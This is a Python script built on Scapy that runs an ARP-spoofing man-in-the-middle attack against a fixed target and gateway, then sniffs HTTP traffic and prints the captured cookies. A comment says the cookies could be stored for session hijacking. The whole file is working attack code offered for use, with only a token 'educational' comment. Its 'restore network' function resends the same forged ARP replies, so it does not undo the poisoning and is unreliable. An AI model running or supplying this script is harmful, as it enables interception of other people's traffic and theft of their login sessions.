from scapy.all import ARP, Ether, sniff, send, srp
from scapy.layers.inet import IP, TCP
import re
from http.cookies import SimpleCookie

# Define target and gateway
target_ip = "192.168.1.100"  # Target IP
gateway_ip = "192.168.1.1"   # Gateway IP
interface = "eth0"           # Your network interface (e.g., eth0, wlan0)

# ARP Spoofing function to redirect traffic
def arp_spoof(target_ip, gateway_ip, interface):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    arp_response_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_response_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_response_to_target, verbose=False)
    send(arp_response_to_gateway, verbose=False)

# Get MAC address using ARP request
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = ether_frame/arp_request
    response, _ = srp(arp_request_packet, timeout=1, verbose=False)

    for _, rcv in response:
        return rcv[Ether].src

# Function to handle intercepted packets
def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        payload = str(packet[TCP].payload)

        # Looking for HTTP responses with cookies
        if "HTTP" in payload and "Set-Cookie" in payload:
            print(f"[*] HTTP Response Captured from {ip_src} to {ip_dst}")
            extract_cookies(payload)

        # Looking for HTTP requests with cookies
        if "Cookie" in payload:
            print(f"[*] HTTP Request Captured from {ip_src} to {ip_dst}")
            extract_cookies(payload)

# Extract cookies from HTTP headers
def extract_cookies(payload):
    cookies = re.findall(r"Cookie: (.*?)(?:\r\n|$)", payload, re.IGNORECASE)
    if cookies:
        print("[*] Found Cookies:")
        for cookie in cookies:
            print(cookie)
            # Here, you can store the cookie for potential session hijacking
            # For educational purposes, just print them for now
    else:
        # Look for Set-Cookie header in responses
        set_cookie = re.findall(r"Set-Cookie: (.*?)(?:\r\n|$)", payload, re.IGNORECASE)
        if set_cookie:
            print("[*] Found Set-Cookie:")
            for cookie in set_cookie:
                print(cookie)

# Start Sniffing for HTTP traffic
def start_sniffing():
    sniff(prn=packet_callback, store=0, iface=interface)

# ARP Spoofing to intercept traffic
def arp_spoofing():
    try:
        print("[+] Starting MITM Attack (ARP Spoofing)...")
        arp_spoof(target_ip, gateway_ip, interface)
        start_sniffing()
    except KeyboardInterrupt:
        print("[+] Stopping the attack.")
        print("[+] Restoring network to normal.")
        restore_network()

# Restore the network by stopping the ARP spoofing
def restore_network():
    print("[+] Restoring network to original state...")
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    arp_response_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_response_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_response_to_target, count=4, verbose=False)
    send(arp_response_to_gateway, count=4, verbose=False)

if __name__ == "__main__":
    arp_spoofing()
